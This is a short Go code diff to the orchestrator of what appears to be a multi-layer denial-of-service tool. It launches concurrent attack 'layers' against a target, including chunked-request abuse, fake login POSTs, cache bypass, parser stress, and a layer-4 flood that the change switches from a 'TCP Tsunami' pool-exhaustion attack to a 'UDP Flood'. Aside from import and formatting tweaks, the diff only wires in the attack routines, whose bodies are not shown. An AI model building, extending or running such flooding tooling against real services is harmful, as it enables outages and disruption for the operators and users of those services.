@@ -5,11 +5,11 @@ import (
 	"crypto/rand"
 	"encoding/hex"
 	"encoding/json"
+	"fmt"
 	"log"
 	"net/url"
 	"sync"
 	"time"
-	"fmt"
 )
 
 type Orchestrator struct {
@@ -65,7 +65,7 @@ func NewOrchestrator(
 	}
 }
 
-func (o *Orchestrator) ID() string    { return o.id }
+func (o *Orchestrator) ID() string     { return o.id }
 func (o *Orchestrator) Target() string { return o.target.String() }
 func (o *Orchestrator) UptimeMs() int64 {
 	o.mu.Lock()
@@ -99,7 +99,6 @@ func (o *Orchestrator) Start() {
 		timer = time.After(o.duration)
 	}
 
-	// Launch all 5 layers
 	o.wg.Add(1)
 	go o.launchLayer("L1 - Chunked Abuse", o.layers.L1, layer1Chunked, timer)
 	o.wg.Add(1)
@@ -107,7 +106,7 @@ func (o *Orchestrator) Start() {
 	o.wg.Add(1)
 	go o.launchLayer("L3 - Fake Login POST", o.layers.L3, layer3CacheBypass, timer)
 	o.wg.Add(1)
-	go o.launchLayer("L4 - TCP Tsunami", o.layers.L4, layer4PoolExhaust, timer)
+	go o.launchLayer("L4 - UDP Flood", o.layers.L4, udpNetworkFlood, timer)
 	o.wg.Add(1)
 	go o.launchLayer("L5 - Parser Stress", o.layers.L5, layer5ParserStress, timer)
 
